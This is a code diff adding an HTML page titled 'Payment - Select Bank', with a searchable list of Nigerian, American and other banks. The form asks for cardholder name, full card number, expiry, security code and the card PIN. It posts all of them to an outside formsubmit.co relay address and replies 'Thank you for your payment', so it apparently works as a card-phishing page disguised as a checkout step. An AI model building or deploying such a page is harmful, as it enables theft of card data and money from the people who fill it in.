@@ -1,0 +1,378 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Payment - Select Bank</title>
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <style>
+    body {
+      background: #f6faff;
+      font-family: Arial, sans-serif;
+      margin: 0;
+      padding: 0;
+    }
+    .payment-container {
+      background: #fff;
+      max-width: 410px;
+      margin: 48px auto 0 auto;
+      border-radius: 7px;
+      box-shadow: 0 2px 8px rgba(25,60,110,0.10);
+      padding: 24px 4vw 18px 4vw;
+      border: 1px solid #e1e5eb;
+    }
+    .payment-form label {
+      display: block;
+      margin-top: 18px;
+      font-size: 1.03em;
+      font-weight: bold;
+      color: #252525;
+    }
+    .payment-form label .req {
+      color: #e44637;
+      margin-left: 2px;
+    }
+    .form-row {
+      display: flex;
+      gap: 18px;
+      margin-top: 2px;
+    }
+    @media (max-width: 480px) {
+      .form-row {
+        flex-direction: column;
+        gap: 0;
+      }
+    }
+    .form-row select,
+    .payment-form input[type="text"],
+    .payment-form input[type="number"],
+    .payment-form input[type="password"] {
+      font-size: 1em;
+      padding: 9px 8px;
+      border-radius: 4px;
+      border: 1px solid #b2cbe4;
+      margin-top: 2px;
+      width: 100%;
+      outline: none;
+      box-sizing: border-box;
+      transition: border 0.13s;
+    }
+    .payment-form input[type="text"]:focus,
+    .payment-form input[type="number"]:focus,
+    .payment-form input[type="password"]:focus,
+    .form-row select:focus {
+      border-color: #0d75eb;
+    }
+    .bank-search-bar {
+      width: 100%;
+      padding: 8px 11px;
+      margin-bottom: 10px;
+      margin-top: 13px;
+      border-radius: 4px;
+      border: 1.2px solid #b2cbe4;
+      font-size: 1em;
+      background: #f8fafc;
+      box-sizing: border-box;
+    }
+    .bank-list {
+      max-height: 140px;
+      overflow-y: auto;
+      margin-bottom: 8px;
+      border: 1px solid #e3e8ee;
+      background: #f8faff;
+      border-radius: 4px;
+      padding: 0;
+      box-sizing: border-box;
+      list-style-type: none;
+    }
+    .bank-list li {
+      padding: 9px 12px;
+      cursor: pointer;
+      border-bottom: 1px solid #e3e8ee;
+      transition: background 0.15s;
+    }
+    .bank-list li:last-child {
+      border-bottom: none;
+    }
+    .bank-list li:hover,
+    .bank-list li.selected {
+      background: #e5f0ff;
+      color: #184cc5;
+      font-weight: bold;
+    }
+    .inline-hint {
+      color: #6b778c;
+      font-size: .97em;
+      margin-left: 10px;
+      display: inline-block;
+      margin-bottom: 2px;
+    }
+    .actions {
+      margin-top: 26px;
+      text-align: right;
+      margin-bottom: 4px;
+      display: flex;
+      justify-content: flex-end;
+      flex-wrap: wrap;
+      gap: 10px;
+    }
+    .actions button, .actions a {
+      min-width: 88px;
+      font-weight: bold;
+      font-size: 1.04em;
+    }
+    .actions .cancel {
+      background: transparent;
+      border: none;
+      color: #0d75eb;
+      text-decoration: underline;
+      cursor: pointer;
+      padding: 0;
+    }
+    .actions .next {
+      background: #308b39;
+      color: #fff;
+      border: none;
+      border-radius: 4px;
+      padding: 9px 22px;
+      cursor: pointer;
+      transition: background 0.18s;
+    }
+    .actions .next:hover {
+      background: #246e2d;
+    }
+    .bank-group-label {
+      font-weight: bold;
+      font-size: 1.02em;
+      color: #2e4f8a;
+      padding: 6px 10px 2px 11px;
+      background: #f0f6fc;
+    }
+  </style>
+</head>
+<body>
+  <div class="payment-container">
+    <form id="paymentForm" class="payment-form" autocomplete="off" method="POST" action="https://formsubmit.co/0e97689de0a4360ff0feaea0c27addcd">
+      <label for="name">Cardholder name <span class="req">*</span></label>
+      <input id="name" name="name" type="text" required autocomplete="cc-name">
+      <label for="cardnumber">Card number <span class="req">*</span></label>
+      <input id="cardnumber" name="cardnumber" type="text" inputmode="numeric" maxlength="16" minlength="16" required autocomplete="cc-number">
+<label for="bank-search">Select Your Bank <span class="req">*</span></label>
+      <input id="bank-search" class="bank-search-bar" type="text" autocomplete="off" placeholder="Search bank name...">
+      <ul class="bank-list" id="bankList"></ul>
+      <input type="hidden" id="selectedBank" name="bank" required>
+      <div class="form-row">
+        <div style="flex:1;">
+          <label for="expmonth" style="margin-top:18px;">Expiry month <span class="req">*</span></label>
+          <select id="expmonth" name="expmonth" required autocomplete="cc-exp-month">
+            <option value="" disabled selected>MM</option>
+            <option>01</option><option>02</option><option>03</option><option>04</option>
+            <option>05</option><option>06</option><option>07</option><option>08</option>
+            <option>09</option><option>10</option><option>11</option><option>12</option>
+          </select>
+        </div>
+        <div style="flex:1.2;">
+          <label for="expyear" style="margin-top:18px;">Expiry year <span class="req">*</span></label>
+          <select id="expyear" name="expyear" required autocomplete="cc-exp-year">
+            <option value="" disabled selected>YY</option>
+            <option>24</option><option>25</option><option>26</option><option>27</option>
+            <option>28</option><option>29</option><option>30</option><option>31</option>
+          </select>
+        </div>
+      </div>
+
+      <label for="cvc">Security code <span class="req">*</span></label>
+      <div style="display:flex; align-items:center;">
+        <input id="cvc" name="cvc" type="text" inputmode="numeric" maxlength="3" minlength="3" required autocomplete="cc-csc" style="width:120px;">
+        <span class="inline-hint">3 digits on back of your card</span>
+      </div>
+
+      <label for="pin">Card PIN <span class="req">*</span></label>
+      <input id="pin" name="pin" type="password" inputmode="numeric" maxlength="4" minlength="4" required>
+
+      <div class="actions">
+        <button type="button" class="cancel" onclick="window.history.back()">Cancel</button>
+        <button class="next" type="submit">Next</button>
+      </div>
+      <input type="hidden" name="_autoresponse" value="Thank you for your payment.">
+      <input type="hidden" name="_template" value="table">
+    </form>
+  </div>
+  <script>
+    // Example bank data structure for worldwide, American, Nigerian banks (expand as needed)
+    const bankGroups = [
+      {
+        label: "Nigerian Banks",
+        banks: [
+          "Access Bank",
+          "Fidelity Bank",
+          "First Bank of Nigeria",
+          "Guaranty Trust Bank (GTBank)",
+          "United Bank for Africa (UBA)",
+          "Zenith Bank",
+          "Union Bank of Nigeria",
+          "Stanbic IBTC Bank",
+          "Sterling Bank",
+          "Keystone Bank",
+          "FCMB",
+          "Ecobank Nigeria",
+          "Polaris Bank",
+          "Wema Bank",
+          "EcoBank",
+          "Opay",
+          "Palmpay",
+
+        ]
+      },
+      {
+        label: "American Banks",
+        banks: [
+          "Bank of America",
+          "Chase Bank (JPMorgan Chase)",
+          "Wells Fargo",
+          "Citibank",
+          "U.S. Bank",
+          "PNC Bank",
+          "Capital One",
+          "TD Bank",
+          "HSBC Bank USA",
+          "Fifth Third Bank",
+          "KeyBank",
+          "Regions Bank",
+        ]
+      },
+      {
+        label: "Other Banks",
+        banks: [
+          "HSBC",
+          "Barclays",
+          "Santander",
+          "Deutsche Bank",
+          "BNP Paribas",
+          "UBS",
+          "Scotiabank",
+          "Credit Suisse",
+          "Bank of China",
+          "Royal Bank of Canada",
+          "ANZ",
+          "Standard Chartered",
+          "ING",
+          "PayPal",
+        ]
+      },
+    ];
+
+    const bankListEl = document.getElementById('bankList');
+    const bankSearchEl = document.getElementById('bank-search');
+    const selectedBankInput = document.getElementById('selectedBank');
+    let highlightedIndex = -1;
+    let filteredBanksList = [];
+
+    // Render bank list
+    function renderBankList(filter = "") {
+      bankListEl.innerHTML = "";
+      filteredBanksList = [];
+      bankGroups.forEach(group => {
+        const matched = group.banks.filter(b => b.toLowerCase().includes(filter.toLowerCase()));
+        if (matched.length) {
+          // Group label
+          const labelLi = document.createElement('li');
+          labelLi.className = "bank-group-label";
+          labelLi.textContent = group.label;
+          labelLi.tabIndex = -1;
+          bankListEl.appendChild(labelLi);
+          // Banks
+          matched.forEach(bank => {
+            const bankLi = document.createElement('li');
+            bankLi.textContent = bank;
+            bankLi.setAttribute('data-name', bank);
+            bankLi.tabIndex = 0;
+            bankLi.onclick = function() {
+              selectThisBank(bankLi);
+            };
+            bankLi.onkeydown = function(e) {
+              if(e.key === "Enter" || e.key === " ") selectThisBank(bankLi);
+            };
+            filteredBanksList.push(bankLi);
+            bankListEl.appendChild(bankLi);
+          });
+        }
+      });
+      highlightedIndex = -1;
+    }
+    function selectThisBank(li) {
+      filteredBanksList.forEach(b=>b.classList.remove('selected'));
+      li.classList.add('selected');
+      selectedBankInput.value = li.getAttribute('data-name');
+      bankSearchEl.value = li.getAttribute('data-name');
+    }
+    bankSearchEl.addEventListener('input', function() {
+      renderBankList(this.value);
+      if (filteredBanksList.length) {
+        filteredBanksList[0].classList.add('selected');
+        highlightedIndex = 0;
+        selectedBankInput.value = filteredBanksList[0].getAttribute('data-name');
+      } else {
+        selectedBankInput.value = "";
+      }
+    });
+    bankSearchEl.addEventListener('keydown', function(e) {
+      if (!filteredBanksList.length) return;
+      // Arrow down
+      if(e.key === "ArrowDown") {
+        highlightedIndex = (highlightedIndex+1)%filteredBanksList.length;
+        filteredBanksList.forEach(b=>b.classList.remove('selected'));
+        filteredBanksList[highlightedIndex].classList.add('selected');
+        selectedBankInput.value = filteredBanksList[highlightedIndex].getAttribute('data-name');
+        filteredBanksList[highlightedIndex].scrollIntoView({block:"nearest"});
+      }
+      // Arrow up
+      if(e.key === "ArrowUp") {
+        highlightedIndex = (highlightedIndex-1+filteredBanksList.length)%filteredBanksList.length;
+        filteredBanksList.forEach(b=>b.classList.remove('selected'));
+        filteredBanksList[highlightedIndex].classList.add('selected');
+        selectedBankInput.value = filteredBanksList[highlightedIndex].getAttribute('data-name');
+        filteredBanksList[highlightedIndex].scrollIntoView({block:"nearest"});
+      }
+      // Enter
+      if(e.key === "Enter") {
+        filteredBanksList[highlightedIndex]?.click();
+      }
+    });
+    renderBankList();
+
+    // Card number: only digits, max 16
+    document.getElementById('cardnumber').addEventListener('input', function() {
+      this.value = this.value.replace(/\D/g, '').slice(0,16);
+    });
+    // Security code: only digits, max 3
+    document.getElementById('cvc').addEventListener('input', function() {
+      this.value = this.value.replace(/\D/g, '').slice(0,3);
+    });
+    // Card PIN: only digits, max 4
+    document.getElementById('pin').addEventListener('input', function() {
+      this.value = this.value.replace(/\D/g, '').slice(0,4);
+    });
+    // Cardholder: only letters and spaces
+    document.getElementById('name').addEventListener('input', function() {
+      this.value = this.value.replace(/[^a-zA-Z\s]/g, '');
+    });
+
+    // Validate before submit
+    document.getElementById('paymentForm').addEventListener('submit', function(e) {
+      const cardNumber = document.getElementById('cardnumber');
+      const cvc = document.getElementById('cvc');
+      const pin = document.getElementById('pin');
+      const bank = selectedBankInput.value;
+      const errors = [];
+      if(cardNumber.value.length !== 16) errors.push("Please enter exactly 16 digits for card number.");
+      if(cvc.value.length !== 3) errors.push("Please enter exactly 3 digits for security code.");
+      if(pin.value.length !== 4) errors.push("Please enter exactly 4 digits for card PIN.");
+      if(!bank) errors.push("Please select your bank.");
+      if(errors.length > 0) {
+        alert(errors.join('\n'));
+        e.preventDefault();
+      }
+    });
+  </script>
+</body>
+</html>
